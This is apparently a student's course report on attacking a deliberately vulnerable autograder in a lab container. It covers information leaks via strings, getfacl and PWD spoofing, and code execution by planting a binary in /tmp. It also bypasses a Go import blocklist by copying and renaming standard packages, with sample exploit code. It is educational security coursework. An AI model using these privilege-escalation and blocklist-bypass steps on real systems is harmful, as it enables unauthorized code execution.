---
title: Project Handin Report
author:
  - christopher_freytes@brown.edu
  - 'Brown ID: B01792886'
date: '2023-03-24'
subject: Markdown
keywords:
  - Markdown
  - Example
subtitle: Project Handin Report
lang: en
titlepage: true
titlepage-color: 1E90FF
titlepage-text-color: FFFAFA
titlepage-rule-color: FFFAFA
titlepage-rule-height: 2
book: true
classoption: oneside
code-block-font-size: \scriptsize
mainfont: System font, sans-serif
---

# Project Handin Report

## Introduction

The purpose of this project was to find vulnerabilities in the file system and more importantly issues within the autograder application.

## Objective

The file system is a very critical component of any system. From the kernal, to all the services and components the file system is a very expansive attack vector. The attacks focus on the autograder service, and expliots found in the filesystem and linux. Lastly, the following wiki was referenced for clarity: <https://cs.brown.edu/courses/csci1660/handin-wiki/>, and <https://hackmd.io/@cs1660/handin-setup-guide#Running-programs-from-a-setuid-program>

## Setup

- Prior to beginning these expliots the following command was run: ```./run-container --clean``` 

    ![](https://raw.githubusercontent.com/Freytes/freytes.github.io/main/project-handin/img/hnd_image1.png){width=50%}

# Metadata Exploitation: Misconfigured File / Directory Permissions (permconf, data exfiltration)

- Metadata: ```permconf```

## Discovery

- Start Docker Container: ```./run-container```

    ![](https://raw.githubusercontent.com/Freytes/freytes.github.io/main/project-handin/img/hnd_image2.png){width=50%}
  
- Change directory into: ```cd /course/cs666/bin```
    ![](https://raw.githubusercontent.com/Freytes/freytes.github.io/main/project-handin/img/hnd_image3.png){width=50%}
- From within: ```/course/cs666/bin```

- Run the following command:  ```strings cs666_handin```
    ![](https://raw.githubusercontent.com/Freytes/freytes.github.io/main/project-handin/img/hnd_image4.png){width=50%}
- The result of this command will display the non-binary out of the 'cs666_handin' process. As an attacker this information can be critical in the discovery process. 

## Impact

The impact of ```strings cs666_handin``` exploit allows for users to know information that is usually hidden, thus allowing them to gain unknown information.

## Mitigation

Here are some mitigation strategies to prevent metadata exploitation, or file permissions attacks. A strategy would be to make the ```cs666_handin``` file not readable by users.

# Metadata Exploitation: Misconfigured File / Directory Permissions (permconf, data exfiltration)

- Metadata: ```permconf```
- Data Exfiltration: ```exfil-pi```

## Discovery

- Change directory into (home):```cd $HOME```
  ![](https://raw.githubusercontent.com/Freytes/freytes.github.io/main/project-handin/img/hnd_image6.png){width=50%}
- change directory into (ivy-stencil):```cd /ivy-stencil``` 
  ![](https://raw.githubusercontent.com/Freytes/freytes.github.io/main/project-handin/img/hnd_image7.png){width=50%}
- Run the follow command: ```cs666_handin ivy```
  ![](https://raw.githubusercontent.com/Freytes/freytes.github.io/main/project-handin/img/hnd_image7.png)

- Change directory into (root): ```cd /```
    ![](https://raw.githubusercontent.com/Freytes/freytes.github.io/main/project-handin/img/hnd_image5.png){width=50%}

- Change directory into (tmp): ```cd tmp```
    ![](https://raw.githubusercontent.com/Freytes/freytes.github.io/main/project-handin/img/hnd_image8.png){width=50%}

- Run the following command on any file in the directory: ```getfacl```
    ![](https://raw.githubusercontent.com/Freytes/freytes.github.io/main/project-handin/img/hnd_image9.png){width=50%}

- The autograder uses this folder, for temporary purposes. As it is public anyone can see into this folder and identify who last submitted an assignment based on left over binaries.

## Impact
The impact of ```getfacl tmp <file>``` exploit allows for users to know information about individuals who handed in projects previously gaining unknown information.

## Mitigation

Here are some mitigation strategies to prevent metadata exploitation, or file permissions attacks. A strategy would be to make the ```tmp``` folder viewable by users.

# Metadata Exploitation: Misconfigured File / Directory Permissions (permconf, data exfiltration)

- Metadata: ```permconf```

## Discovery

- Change directory into (cs666): ```cd /course/cs666```
- Run the following command: ```PWD="/home/alice" && cs666_handin ivy```
    ![](https://raw.githubusercontent.com/Freytes/freytes.github.io/main/project-handin/img/hnd_image27.png){width=50%}
    
## Imapact
The impact of ```PWD="/home/alice" && cs666_handin ivy``` exploit allows for users to know information about hiddent or restricted files in the file system.

## Mitigation
Here are some mitigation strategies to prevent metadata exploitation, or file permissions attacks. A strategy would be to make the ```cs666_handin``` binary hardend and only executable in the home directory using regex. Another solution would be to reset ```PWD``` during the system call, rather than just calling it during runtime.

# Arbitary Code Execution (permconf, data exfiltration, path-byp)

- Metadata: ```permconf```
- Data Exfiltration: ```exfil-pi```
- Path Bypass: ```path-byp```

## Discovery

- Change directory into (root): ```cd /```
    ![](https://raw.githubusercontent.com/Freytes/freytes.github.io/main/project-handin/img/hnd_image5.png){width=50%}
    
- Change directory into (tmp): ```cd tmp```
    ![](https://raw.githubusercontent.com/Freytes/freytes.github.io/main/project-handin/img/hnd_image8.png){width=50%}

- Run the following command to create a .go file: ```vim cs666_bin.go```
    ![](https://raw.githubusercontent.com/Freytes/freytes.github.io/main/project-handin/img/hnd_image10.png){width=50%}

- Within the ```cs666_bin.go``` add the following information:
```
package main

import ("os/exec"
        "fmt"
		)
func main() {

	out, err := exec.Command("cs666_whoami").Output()
	
	if err != nil{
		panic(err)
	}
	fmt.Printf("Executing Exploit: %s \n", out)
}

```
- Run the following command to build the .go file:```go build cs666_bin.go```
    ![](https://raw.githubusercontent.com/Freytes/freytes.github.io/main/project-handin/img/hnd_image12.png){width=50%}
- Run the following command to set the correct permissions on the .go file: ```chmod a-w ./cs666_bin```
    ![](https://raw.githubusercontent.com/Freytes/freytes.github.io/main/project-handin/img/hnd_image13.png){width=50%}
- Change Directories to: ```cd $HOME```
    ![](https://raw.githubusercontent.com/Freytes/freytes.github.io/main/project-handin/img/hnd_image14.png){width=50%}
- Change Directories to: ```cd ivy-stencil```
   ![](https://raw.githubusercontent.com/Freytes/freytes.github.io/main/project-handin/img/hnd_image14.png){width=50%}

- From within ```cd ivy-stencil``` run the following: ```cs666_handin ivy```
   ![](https://raw.githubusercontent.com/Freytes/freytes.github.io/main/project-handin/img/hnd_image16.png){width=50%}
- The autograder uses a binary called ```cs666_bin``` to compile the files needed for the process. Creating the file preemtively in ```tmp``` allows us to run our exploit

## Impact
The impact of ```cs666_bin``` exploit allows for users to run compiled code within the ```/tmp``` directory. Through discovery it is identified that the autograder uses a binary called ```cs666_bin```. Using this file allows us to inject code and exploit the system. 

## Mitigation
Here are some mitigation strategies to prevent Arbitary code execution. A strategy would be to make the ```/tmp``` directory locked from the user. 

# Arbitary Code Execution (permconf, data exfiltration, path-byp, listconf)

- Metadata: ```permconf```
- Data Exfiltration: ```exfil-pi```
- Path Bypass: ```path-byp```
- Blocklist Bypass: ```listconf```

## Discovery
- Change GROOT: ```export GOROOT=/home/alice/ivy-stencil/go```  
   ![](https://raw.githubusercontent.com/Freytes/freytes.github.io/main/project-handin/img/hnd_image17.png){width=50%}
- Change Directory into:```cd $HOME```
    ![](https://raw.githubusercontent.com/Freytes/freytes.github.io/main/project-handin/img/hnd_image18.png){width=50%}
- Change Directory into:```cd ivy-stencil```
    ![](https://raw.githubusercontent.com/Freytes/freytes.github.io/main/project-handin/img/hnd_image19.png){width=50%}

-  Copy entire Go Directory: ```cp -r /usr/local/go ./go```
    ![](https://raw.githubusercontent.com/Freytes/freytes.github.io/main/project-handin/img/hnd_image20.png){width=50%}
-  Change Directory into: ```cd /go/scr/``` 
    ![](https://raw.githubusercontent.com/Freytes/freytes.github.io/main/project-handin/img/hnd_image21.png){width=50%}
-  Copy/rename fmt file: ```cp -r ./fmt ./lnout```
    ![](https://raw.githubusercontent.com/Freytes/freytes.github.io/main/project-handin/img/hnd_image22.png){width=50%}
-  Copy/rename os file:  ```cp -r ./os ./so```
    ![](https://raw.githubusercontent.com/Freytes/freytes.github.io/main/project-handin/img/hnd_image23.png){width=50%}
-  Change Directory into:```cd $HOME```
    ![](https://raw.githubusercontent.com/Freytes/freytes.github.io/main/project-handin/img/hnd_image18.png){width=50%}
-  Change Directory into:```cd ivy-stencil```
    ![](https://raw.githubusercontent.com/Freytes/freytes.github.io/main/project-handin/img/hnd_image19.png){width=50%}
-  Within ```sol.go``` add the following package: ```so/exec```
    ![](https://raw.githubusercontent.com/Freytes/freytes.github.io/main/project-handin/img/hnd_image24.png){width=50%}
-  Within ```sol.go``` add the following renamed packages: ```so & lnout```
    ![](https://raw.githubusercontent.com/Freytes/freytes.github.io/main/project-handin/img/hnd_image26.png){width=50%}
-  Add the following line of go code to execute exec in ```sol.go```:
``` 
	out, err := exec.Command("cs666_whoami").Output()
	if err != nil
	{
		panic(err)
	}
	fmt.Printf("Exploited Information: %s",out)
```
 - Run the command: ```make```
 - Run the command: ```cs666_handin ivy```
 
## Impact
The impact of ```sol.go``` exploit allows for users to write malicious code but at an elevated user privilege, due to the autograder using elevated service calls. The attack is complicated because there is a block list of certian libaries. Bypassing those libaries required a copy, of those binaries.

## Mitigation
Here are some mitigation strategies to prevent Arbitary code execution. A strategy would be to make the following changes:
- Use regex to limit where the core golang binaries run: ```/usr/local/go```
- White list the required binaries for core golang functionality.